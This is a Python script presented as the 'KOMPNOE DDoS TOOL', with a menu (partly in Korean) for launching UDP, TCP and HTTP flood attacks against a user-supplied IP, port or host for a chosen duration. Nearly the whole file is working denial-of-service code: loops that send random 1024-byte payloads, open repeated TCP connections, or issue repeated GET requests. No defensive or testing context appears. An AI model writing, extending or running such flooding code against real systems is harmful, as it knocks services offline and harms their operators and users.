import socket
import random
import time
import threading
import os
from colorama import init, Fore, Style
import http.client

init(autoreset=True)

ascii_logo = r"""
██╗  ██╗ ██████╗ ███╗   ███╗██████╗  ██████╗ ███╗   ██╗███████╗
██║ ██╔╝██╔═══██╗████╗ ████║██╔══██╗██╔═══██╗████╗  ██║██╔════╝
█████╔╝ ██║   ██║██╔████╔██║██║  ██║██║   ██║██╔██╗ ██║█████╗  
██╔═██╗ ██║   ██║██║╚██╔╝██║██║  ██║██║   ██║██║╚██╗██║██╔══╝  
██║  ██╗╚██████╔╝██║ ╚═╝ ██║██████╔╝╚██████╔╝██║ ╚████║███████╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝
             >>> KOMPNOE DDoS TOOL <<<
"""

purple_colors = [
    Fore.LIGHTMAGENTA_EX,
    Fore.MAGENTA,
    Fore.LIGHTWHITE_EX
]

def animate_intro():
    for _ in range(3):
        for color in purple_colors:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(color + ascii_logo + Style.RESET_ALL)
            time.sleep(0.2)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.LIGHTMAGENTA_EX + ascii_logo + Style.RESET_ALL)
    input(Fore.LIGHTWHITE_EX + "\n>> Press [Enter] to show menu..." + Style.RESET_ALL)

def show_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.LIGHTMAGENTA_EX + ascii_logo + Style.RESET_ALL)
    print(Fore.LIGHTWHITE_EX + "\n1번은 UDP Flood\n2번은 TCP Flood\n3번은 HTTP Flood" + Style.RESET_ALL)

def udp_flood(target_ip, target_port, duration):
    print(f"\n[+] Starting UDP Flood on {target_ip}:{target_port} for {duration} seconds")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    timeout = time.time() + duration
    sent = 0
    while time.time() < timeout:
        try:
            sock.sendto(payload, (target_ip, target_port))
            sent += 1
        except:
            break
    print(f"\n[*] UDP Flood finished. Packets sent: {sent:,}")

def tcp_flood(target_ip, target_port, duration):
    print(f"\n[+] Starting TCP Flood on {target_ip}:{target_port} for {duration} seconds")
    timeout = time.time() + duration
    sent = 0
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(random._urandom(1024))
            sock.close()
            sent += 1
        except:
            pass
    print(f"\n[*] TCP Flood finished. Connections attempted: {sent:,}")

def http_flood(target_host, duration):
    print(f"\n[+] Starting HTTP Flood on {target_host} for {duration} seconds")
    timeout = time.time() + duration
    sent = 0
    while time.time() < timeout:
        try:
            conn = http.client.HTTPConnection(target_host, timeout=2)
            conn.request("GET", "/")
            conn.getresponse()
            sent += 1
            conn.close()
        except:
            pass
    print(f"\n[*] HTTP Flood finished. Requests sent: {sent:,}")

def attack_menu():
    while True:
        show_menu()
        choice = input("\n>> 공격 타입을 선택하세요 (1/2/3): ")

        if choice == '1':
            ip = input("Target IP: ")
            port = int(input("Port: "))
            dur = int(input("Duration (sec): "))
            udp_flood(ip, port, dur)
        elif choice == '2':
            ip = input("Target IP: ")
            port = int(input("Port: "))
            dur = int(input("Duration (sec): "))
            tcp_flood(ip, port, dur)
        elif choice == '3':
            host = input("Target Host (example.com): ")
            dur = int(input("Duration (sec): "))
            http_flood(host, dur)
        else:
            print("[!] 잘못된 선택입니다. 1, 2, 3 중에서 선택하세요.")
            time.sleep(2)
            continue

        again = input("\n다시 공격할까요? (y/n): ").lower()
        if again != 'y':
            print("\n[*] KOMPNOE TOOL 종료합니다.")
            break
        else:
            animate_intro()
            # 메뉴는 attack_menu 내에서 바로 출력되므로 추가 input 없이 진행

if __name__ == "__main__":
    animate_intro()
    attack_menu()
